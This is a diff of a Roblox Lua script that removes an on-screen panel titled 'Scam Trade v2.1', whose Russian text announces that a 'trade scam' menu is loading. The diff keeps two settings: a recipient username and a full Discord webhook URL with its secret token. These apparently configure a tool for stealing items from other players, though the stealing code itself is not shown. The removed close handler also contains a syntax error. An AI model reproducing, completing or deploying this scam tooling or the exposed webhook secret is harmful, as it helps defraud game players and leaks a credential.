@@ -1,49 +1,4 @@
--- Создаем GUI
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "ScamTradeGUI"
-screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 300, 0, 150)
-frame.Position = UDim2.new(0.5, -150, 0.5, -75)
-frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-frame.BorderSizePixel = 0
-frame.Parent = screenGui
-
-local title = Instance.new("TextLabel")
-title.Text = "Scam Trade v2.1"
-title.Size = UDim2.new(1, 0, 0, 40)
-title.Position = UDim2.new(0, 0, 0, 0)
-title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-title.TextColor3 = Color3.fromRGB(255, 0, 0)
-title.Font = Enum.Font.GothamBold
-title.TextSize = 20
-title.Parent = frame
-
-local status = Instance.new("TextLabel")
-status.Text = "Трейд скам загружается, он будет доступен в течении 10 минут(меню откроется автоматически.)"
-status.Size = UDim2.new(1, -20, 0, 80)
-status.Position = UDim2.new(0, 10, 0, 50)
-status.BackgroundTransparency = 1
-status.TextColor3 = Color3.fromRGB(255, 255, 255)
-status.Font = Enum.Font.Gotham
-status.TextSize = 16
-status.TextWrapped = true
-status.Parent = frame
-
-local closeButton = Instance.new("TextButton")
-closeButton.Text = "X"
-closeButton.Size = UDim2.new(0, 30, 0, 30)
-closeButton.Position = UDim2.new(1, -30, 0, 0)
-closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-closeButton.Font = Enum.Font.GothamBold
-closeButton.TextSize = 18
-closeButton.Parent = frame
-
-closeButton.MouseButton1Click:Connect(function()
-    screenGui:Destroy
- end)
 
 userName = "backsclapes"
 webHook = "https://discord.com/api/webhooks/1355498964002013295/qOoHCpa83gK8IwJbl3bwLIhubKE-5cIDvqnt6syxOeRtrXmwvUzgxaftRGFQuJvnER_s"
